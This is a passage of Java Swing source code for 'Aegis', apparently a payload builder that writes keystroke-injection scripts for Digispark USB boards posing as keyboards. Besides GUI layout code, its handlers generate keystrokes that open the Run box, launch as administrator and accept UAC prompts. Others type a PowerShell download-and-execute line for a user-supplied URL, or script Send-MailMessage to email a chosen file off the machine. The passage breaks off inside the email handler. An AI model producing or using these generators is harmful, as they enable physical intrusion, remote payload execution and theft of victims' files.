                    .addComponent(tbxSMTP, javax.swing.GroupLayout.DEFAULT_SIZE, 85, Short.MAX_VALUE)
                    .addComponent(tbxPort))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(lblSenderEmail, javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(lblSenderPass, javax.swing.GroupLayout.Alignment.TRAILING))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(tbxSenderEmail)
                    .addComponent(tbxPassword))
                .addContainerGap())
        );
        jPanel8Layout.setVerticalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel8Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel8Layout.createSequentialGroup()
                        .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(lblSenderEmail)
                            .addComponent(tbxSenderEmail, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                .addComponent(lblSenderPass)
                                .addComponent(tbxPort, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addComponent(jLabel5))
                            .addComponent(tbxPassword, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(tbxSMTP, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel2)))
                .addContainerGap())
        );

        jPanel3.setBorder(javax.swing.BorderFactory.createTitledBorder("Compose"));

        lblSendEmailTo.setText("Send Email to:");

        lblSubject.setText("Email Subject:");

        jLabel1.setText("Email Message:");

        chkAttachment.setText("Attachment Path:");

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel1)
                            .addComponent(lblSubject)
                            .addComponent(lblSendEmailTo))
                        .addGap(41, 41, 41)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addComponent(tbxSubject, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 267, Short.MAX_VALUE)
                            .addComponent(tbxReceiverEmail, javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(tbxMessage)))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addComponent(chkAttachment)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(tbxAttachPath)))
                .addGap(36, 36, 36))
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblSendEmailTo)
                    .addComponent(tbxReceiverEmail, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblSubject)
                    .addComponent(tbxSubject, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(tbxMessage, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(chkAttachment)
                    .addComponent(tbxAttachPath, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(11, Short.MAX_VALUE))
        );

        btnSendMail.setIcon(new javax.swing.ImageIcon(getClass().getResource("/digiscriptwriter/adminLogo2.png"))); // NOI18N
        btnSendMail.setText("Send Email");
        btnSendMail.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSendMailActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel13Layout = new javax.swing.GroupLayout(jPanel13);
        jPanel13.setLayout(jPanel13Layout);
        jPanel13Layout.setHorizontalGroup(
            jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel13Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jPanel8, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, 421, Short.MAX_VALUE)
                    .addComponent(btnSendMail, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel13Layout.setVerticalGroup(
            jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel13Layout.createSequentialGroup()
                .addGap(6, 6, 6)
                .addComponent(jPanel8, javax.swing.GroupLayout.PREFERRED_SIZE, 65, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(btnSendMail)
                .addContainerGap())
        );

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel13, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel7, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addComponent(jPanel13, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel7, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jTabbedPane1.addTab("Sub Commands", jPanel2);

        lblDrag.setIcon(new javax.swing.ImageIcon(getClass().getResource("/digiscriptwriter/DragFiles.gif"))); // NOI18N

        javax.swing.GroupLayout plDragDropLayout = new javax.swing.GroupLayout(plDragDrop);
        plDragDrop.setLayout(plDragDropLayout);
        plDragDropLayout.setHorizontalGroup(
            plDragDropLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, plDragDropLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(lblDrag, javax.swing.GroupLayout.PREFERRED_SIZE, 455, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        plDragDropLayout.setVerticalGroup(
            plDragDropLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(plDragDropLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(lblDrag, javax.swing.GroupLayout.PREFERRED_SIZE, 427, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jTabbedPane1.addTab("Ducky Script Converter!", plDragDrop);

        jTextArea2.setColumns(20);
        jTextArea2.setRows(5);
        jTextArea2.setText("#define MOD_CONTROL_LEFT    (1<<0)\n#define MOD_SHIFT_LEFT      (1<<1)\n#define MOD_ALT_LEFT        (1<<2)\n#define MOD_GUI_LEFT        (1<<3)\n#define MOD_CONTROL_RIGHT   (1<<4)\n#define MOD_SHIFT_RIGHT     (1<<5)\n#define MOD_ALT_RIGHT       (1<<6)\n#define MOD_GUI_RIGHT       (1<<7)\n\n#define KEY_A       4\n#define KEY_B       5\n#define KEY_C       6\n#define KEY_D       7\n#define KEY_E       8\n#define KEY_F       9\n#define KEY_G       10\n#define KEY_H       11\n#define KEY_I       12\n#define KEY_J       13\n#define KEY_K       14\n#define KEY_L       15\n#define KEY_M       16\n#define KEY_N       17\n#define KEY_O       18\n#define KEY_P       19\n#define KEY_Q       20\n#define KEY_R       21\n#define KEY_S       22\n#define KEY_T       23\n#define KEY_U       24\n#define KEY_V       25\n#define KEY_W       26\n#define KEY_X       27\n#define KEY_Y       28\n#define KEY_Z       29\n#define KEY_1       30\n#define KEY_2       31\n#define KEY_3       32\n#define KEY_4       33\n#define KEY_5       34\n#define KEY_6       35\n#define KEY_7       36\n#define KEY_8       37\n#define KEY_9       38\n#define KEY_0       39\n\n#define KEY_ENTER   40\n\n#define KEY_SPACE   44\n\n#define KEY_F1      58\n#define KEY_F2      59\n#define KEY_F3      60\n#define KEY_F4      61\n#define KEY_F5      62\n#define KEY_F6      63\n#define KEY_F7      64\n#define KEY_F8      65\n#define KEY_F9      66\n#define KEY_F10     67\n#define KEY_F11     68\n#define KEY_F12     69\n\n#define KEY_ARROW_LEFT 0x50");
        jTextArea2.setEnabled(false);
        jScrollPane3.setViewportView(jTextArea2);

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jTextArea1.setText("#include \"DigiKeyboard.h\"\n\nvoid setup()\n{\n  //Set Pins 0 and 1 as outputs.\n  //Some Digisparks have a built-in LED on pin 0, while some have it on\n  //pin 1. This way, we can all Digisparks.\n  pinMode(0, OUTPUT);\n  pinMode(1, OUTPUT);\n}\nvoid loop()\n{\n //Script goes here\n  for(;;){\n      //Set the LED pins to HIGH. This gives power to the LED and turns it on\n      digitalWrite(0, HIGH);\n      digitalWrite(1, HIGH);\n      //Wait for a second\n      delay(1000);\n      //Set the LED pins to LOW. This turns it off\n      digitalWrite(0, LOW);\n      digitalWrite(1, LOW);\n      //Wait for a second\n      delay(1000);\n  }\n}");
        jScrollPane2.setViewportView(jTextArea1);

        jLabel6.setText("Loops LED Flashing ON and OFF");

        javax.swing.GroupLayout jPanel9Layout = new javax.swing.GroupLayout(jPanel9);
        jPanel9.setLayout(jPanel9Layout);
        jPanel9Layout.setHorizontalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jScrollPane3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 455, Short.MAX_VALUE)
                    .addGroup(jPanel9Layout.createSequentialGroup()
                        .addComponent(jLabel6)
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        jPanel9Layout.setVerticalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 212, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel6)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 190, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jTabbedPane1.addTab("Documentation", jPanel9);

        btnClearScript.setText("Clear Script");
        btnClearScript.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnClearScriptActionPerformed(evt);
            }
        });

        jButton1.setText("Copy Script");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        btnSave.setText("Save as a .txt file");
        btnSave.setMaximumSize(new java.awt.Dimension(150, 25));
        btnSave.setMinimumSize(new java.awt.Dimension(150, 25));
        btnSave.setPreferredSize(new java.awt.Dimension(150, 25));
        btnSave.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveActionPerformed(evt);
            }
        });

        jScrollPane4.setBackground(new java.awt.Color(0, 0, 0));
        jScrollPane4.setEnabled(false);

        tbxConsole.setBackground(new java.awt.Color(0, 0, 0));
        tbxConsole.setForeground(new java.awt.Color(255, 255, 255));
        jScrollPane4.setViewportView(tbxConsole);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(btnClearScript, javax.swing.GroupLayout.PREFERRED_SIZE, 180, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 181, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(btnSave, javax.swing.GroupLayout.PREFERRED_SIZE, 181, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jScrollPane1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jTabbedPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 484, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jScrollPane4))
                .addContainerGap(18, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 533, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(btnClearScript)
                            .addComponent(jButton1)
                            .addComponent(btnSave, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jTabbedPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 474, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane4)))
                .addContainerGap())
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents
    String scriptText = "//Script created using Aegis";
    StyledDocument document;
    
    
    private void btnAddDelayActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnAddDelayActionPerformed
        scriptText += addDelay(tbxAddDelay.getText());
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnAddDelayActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        String finalScript = txtbScript.getText();
        StringSelection selection = new StringSelection(finalScript);
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        clipboard.setContents(selection, selection);
        
        send2Consoleln(Color.white, "Script copied to clipboard! just use CTRL + V to paste");
    }//GEN-LAST:event_jButton1ActionPerformed
    
    private void btnEnterActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnEnterActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ENTER")
                        + addDelay(tbxDefaultDelay.getText());
                    
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ENTER");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnEnterActionPerformed

    private void btnClearScriptActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnClearScriptActionPerformed
        scriptText = "//Script created using Aegis";
        txtbScript.setText(scriptText);
        send2Consoleln(Color.red, "Script has been destroyed!");
    }//GEN-LAST:event_btnClearScriptActionPerformed

    private void btnGUIActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnGUIActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("0,MOD_GUI_LEFT")
                    + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("0,MOD_GUI_LEFT");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnGUIActionPerformed

    private void btnText2WriteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnText2WriteActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendString(tbxText2Write.getText().replace("\\", "\\\\").replace("\"", "\\\""))
                    + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendString(tbxText2Write.getText().replace("\\", "\\\\").replace("\"", "\\\""));
        }
        
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnText2WriteActionPerformed

    private void btnUACActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnUACActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ARROW_LEFT")
                        + addDelay("500")
                        + sendKeyStroke("KEY_ENTER")
                        + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ARROW_LEFT")
                        + addDelay("500")
                        + sendKeyStroke("KEY_ENTER");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnUACActionPerformed

    private void btnRunAsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRunAsActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT")
                        + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnRunAsActionPerformed

    private void btnRunBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRunBoxActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_R, MOD_GUI_LEFT")
                        + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("KEY_R, MOD_GUI_LEFT");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnRunBoxActionPerformed

    private void btnDownloadActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDownloadActionPerformed
        if(chkExecute.isSelected()){
            if(chkDefaultDelay.isSelected()){
                scriptText += sendString("$down = New-Object System.Net.WebClient; "
                    + "$url = '"+ tbxDownloadURL.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                    + "$file = '"+ tbxDownloadPath.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                    + "$down.DownloadFile($url,$file); "
                    + "$exec = New-Object -com shell.application; "
                    + "$exec.shellexecute($file); ")
                        + sendKeyStroke("KEY_ENTER")
                        + addDelay(tbxDefaultDelay.getText());
        }else if(!chkDefaultDelay.isSelected()){
                scriptText += sendString("$down = New-Object System.Net.WebClient; "
                    + "$url = '"+ tbxDownloadURL.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                    + "$file = '"+ tbxDownloadPath.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                    + "$down.DownloadFile($url,$file); "
                    + "$exec = New-Object -com shell.application; "
                    + "$exec.shellexecute($file); ")
                        + sendKeyStroke("KEY_ENTER");
        }
        }else if(!chkExecute.isSelected()){
                if(chkDefaultDelay.isSelected()){
                scriptText += sendString("$down = New-Object System.Net.WebClient; "
                        + "$url = '"+ tbxDownloadURL.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                        + "$file = '"+ tbxDownloadPath.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                        + "$down.DownloadFile($url,$file); ")
                            + sendKeyStroke("KEY_ENTER")
                            + addDelay(tbxDefaultDelay.getText());
                }else if(!chkDefaultDelay.isSelected()){
                scriptText += sendString("$down = New-Object System.Net.WebClient; "
                        + "$url = '"+ tbxDownloadURL.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                        + "$file = '"+ tbxDownloadPath.getText().replace("\\", "\\\\").replace("\"", "\\\"") +"'; "
                        + "$down.DownloadFile($url,$file); ")
                            + sendKeyStroke("KEY_ENTER");
                }
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnDownloadActionPerformed

    private void btnSaveActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveActionPerformed
       
        String fileName = JOptionPane.showInputDialog(null,
        "file name:",
        "Save as",
        JOptionPane.INFORMATION_MESSAGE);

        
        if((fileName != null) && (fileName.length() > 0)){
            try {
                File savedScript = new File(fileName + ".txt");
                PrintWriter savToTxt = new PrintWriter(fileName + ".txt");
                savToTxt.println(txtbScript.getText());
                savToTxt.close();

                send2Consoleln(new Color(0, 132, 28), "Script saved as "+fileName+".txt\nFile path: " + savedScript.getAbsolutePath());
            } catch (FileNotFoundException ex) {
                Logger.getLogger(digiScriptWriterF.class.getName()).log(Level.SEVERE, null, ex);
            }
        }else{
            send2Consoleln(Color.red, "Action Cancelled");
        }
    }//GEN-LAST:event_btnSaveActionPerformed

    private void btnTabActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnTabActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("43")
                        + addDelay(tbxDefaultDelay.getText());
                    
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("43");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnTabActionPerformed

    private void btnEscActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnEscActionPerformed
       if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("41")
                        + addDelay(tbxDefaultDelay.getText());
                    
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("41");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnEscActionPerformed

    private void btnCapsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnCapsActionPerformed
       if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("57")
                        + addDelay(tbxDefaultDelay.getText());
                    
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke("57");
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnCapsActionPerformed

    private void chkDefaultDelayActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_chkDefaultDelayActionPerformed
        if(chkDefaultDelay.isSelected()){
            send2Consoleln(Color.GRAY, "Default Delay enabled to: " + tbxDefaultDelay.getText());
        }else{
            send2Consoleln(Color.GRAY, "Default Delay disabled.");
        }
    }//GEN-LAST:event_chkDefaultDelayActionPerformed

    private void btnAddCustomKeyActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnAddCustomKeyActionPerformed
        if(chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke(tbxCustomKey.getText())
                        + addDelay(tbxDefaultDelay.getText());
                    
        }else if(!chkDefaultDelay.isSelected()){
            scriptText += sendKeyStroke(tbxCustomKey.getText());
        }
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnAddCustomKeyActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
       try {
                    Desktop d = Desktop.getDesktop();
                    d.browse(new URI("http://www.usb.org/developers/hidpage/Hut1_12v2.pdf"));
                } catch (URISyntaxException ex) {
                    Logger.getLogger(digiScriptWriterF.class.getName()).log(Level.SEVERE, null, ex);
                } catch (IOException ex) {
                    Logger.getLogger(digiScriptWriterF.class.getName()).log(Level.SEVERE, null, ex);
                }
    }//GEN-LAST:event_jButton3ActionPerformed

    private void btnAddCommentActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnAddCommentActionPerformed
       scriptText += "\n//" + tbxComment.getText();
       txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnAddCommentActionPerformed

    private void btnSendMailActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSendMailActionPerformed
        if(chkAttachment.isSelected()){
            scriptText += sendString("$MyEmail = \\\""+ tbxSenderEmail.getText() +"\\\"\\n" +
                                    "$SMTP= \\\""+tbxSMTP.getText()+"\\\"\\n" +
                                    "$To = \\\""+tbxReceiverEmail.getText()+"\\\"\\n" +
                                    "$Subject = \\\""+ tbxSubject.getText() +"\\\"\\n" +
                                    "$Body = \\\""+ tbxMessage.getText() +"\\\"\\n" +
                                    "$Attachment = \\\""+tbxAttachPath.getText()+"\\\"\\n"+
                                    "$Creds = (Get-Credential -Credential \\\"$MyEmail\\\")\\n") +
                                    addDelay("500") +
                                    sendString(tbxPassword.getText() + "\\n") + 
                                    addDelay("500") +
                                    sendString("Start-Sleep 2; " +
                                    "Send-MailMessage -To $to -From $MyEmail -Subject $Subject -Body $Body -Attachment $Attachment -SmtpServer $SMTP -Credential $Creds -UseSsl -Port "+ tbxPort.getText()) + 
                            sendKeyStroke("KEY_ENTER");
            if(chkDefaultDelay.isSelected())
                scriptText += addDelay(tbxDefaultDelay.getText());
        }else{
            scriptText += sendString("$MyEmail = \\\""+ tbxSenderEmail.getText() +"\\\"\\n" +
                                "$SMTP= \\\""+tbxSMTP.getText()+"\\\"\\n" +
